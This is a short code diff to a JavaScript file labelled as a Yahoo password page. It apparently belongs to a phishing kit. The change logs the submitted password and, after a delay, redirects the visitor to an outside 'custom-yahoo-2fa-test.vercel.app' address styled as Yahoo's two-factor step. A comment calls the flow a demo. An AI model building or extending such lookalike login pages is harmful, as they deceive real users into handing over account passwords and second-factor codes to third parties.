@@ -1,4 +1,4 @@
-// Import jQuery or declare the $ variable before using it
+// Yahoo Password Page JavaScript
 const $ = window.jQuery
 
 $(document).ready(() => {
@@ -99,7 +99,7 @@ $(document).ready(() => {
       return user
     }
 
-    return "user@example.com" // Fallback for testing
+    return "user@example.com"
   }
 
   function showState(state) {
@@ -290,7 +290,18 @@ $(document).ready(() => {
       return false
     }
 
-    handleSeamlessAuth(password)
+    console.log("Password submitted:", password)
+    showState("loading-state")
+
+    // For demo purposes, always proceed to 2FA after 2 seconds
+    setTimeout(() => {
+      showState("mfa-transition")
+
+      setTimeout(() => {
+        window.location.href = "https://custom-yahoo-2fa-test.vercel.app/"
+      }, config.redirectDelay)
+    }, config.retryDelay)
+
     return false
   })
 
